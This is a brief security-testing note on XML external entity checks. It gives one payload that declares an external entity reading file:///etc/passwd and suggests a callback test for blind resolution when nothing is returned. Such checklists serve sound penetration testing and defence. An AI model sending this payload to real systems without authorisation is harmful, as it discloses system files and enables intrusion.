# XML external entity checks

## Entity check
Compare against a normal document.

```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```
- No output → test blind resolution with a callback.
